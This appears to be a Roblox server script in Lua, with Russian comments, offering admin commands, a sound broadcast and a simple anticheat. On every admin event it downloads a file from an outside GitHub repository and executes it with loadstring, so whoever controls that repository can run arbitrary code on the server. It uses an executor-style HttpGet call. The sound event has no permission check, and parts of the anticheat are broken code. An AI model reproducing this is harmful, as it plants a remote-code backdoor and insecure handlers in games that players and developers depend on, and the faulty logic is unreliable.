-- Server.lua
local ServerScriptService = game:GetService("ServerScriptService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- Создаем RemoteEvents для связи
local AdminEvent = Instance.new("RemoteEvent")
AdminEvent.Name = "AdminEvent"
AdminEvent.Parent = game:GetService("ReplicatedStorage")

local PlaySoundEvent = Instance.new("RemoteEvent")
PlaySoundEvent.Name = "PlaySoundEvent"
PlaySoundEvent.Parent = game:GetService("ReplicatedStorage")

local AnimationEvent = Instance.new("RemoteEvent")
AnimationEvent.Name = "AnimationEvent"
AnimationEvent.Parent = game:GetService("ReplicatedStorage")

-- Переменные сервера
local ServerLocked = false
local LockMessage = "Сервер заблокирован администратором!"
local Cheaters = {}

-- Обработка подключения новых игроков
Players.PlayerAdded:Connect(function(player)
    if ServerLocked then
        player:Kick(LockMessage)
    end
end)

-- Обработка админских команд
AdminEvent.OnServerEvent:Connect(function(player, command, ...)
    local args = {...}
    local admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/iris-fecokev/My-Roblox-Script/main/admins.txt", true))()
    local isAdmin = table.find(admins, player.Name) ~= nil
    
    if not isAdmin then return end
    
    if command == "KickAllCheaters" then
        for _, cheater in ipairs(Cheaters) do
            if cheater and cheater ~= player then
                cheater:Kick("Античит: Обнаружено читерство")
            end
        end
        Cheaters = {}
        
    elseif command == "ServerLock" then
        ServerLocked = args[1]
        if #args > 1 then
            LockMessage = args[2]
        end
        
        if ServerLocked then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player then
                    plr:Kick(LockMessage)
                end
            end
        end
        
    elseif command == "InvisibleMode" then
        if player.Character then
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 1
                end
            end
        end
        
    elseif command == "PlayAnimationForAll" then
        for _, plr in ipairs(Players:GetPlayers()) do
            AnimationEvent:FireClient(plr)
        end
    end
end)

-- Обработка звуков
PlaySoundEvent.OnServerEvent:Connect(function(_, soundId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://"..soundId
                sound.Parent = head
                sound:Play()
                game:GetService("Debris"):AddItem(sound, 10)
            end
        end
    end
end)

-- Античит система
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        local humanoid = character:WaitForChild("Humanoid")
        local root = character:WaitForChild("HumanoidRootPart")
        
        -- Детектор полета
        local lastPosition = root.Position
        local flightTime = 0
        
        RunService.Heartbeat:Connect(function()
            if not character:FindFirstChild("HumanoidRootPart") then return end
            
            -- Проверка на полет
            if humanoid:GetState() == Enum.HumanoidStateType.Freefall then
                local velocity = (root.Position - lastPosition).Magnitude
                if velocity < 0.1 then
                    flightTime += 1/30
                    if flightTime > 3 then -- 3 секунды в воздухе
                        table.insert(Cheaters, player)
                    end
                else
                    flightTime = 0
                end
            end
            
            -- Проверка на спин
            local rotationSpeed = (root.CFrame - lastPosition).Magnitude
            if rotationSpeed > 5 then -- Быстрое вращение
                table.insert(Cheaters, player)
            end
            
            lastPosition = root.Position
        end)
    end)
end)

-- Автоматический бан читеров каждые 30 секунд
while true do
    wait(30)
    for _, cheater in ipairs(Cheaters) do
        if cheater then
            cheater:Kick("Античит: Обнаружено читерство")
        end
    end
    Cheaters = {}
end
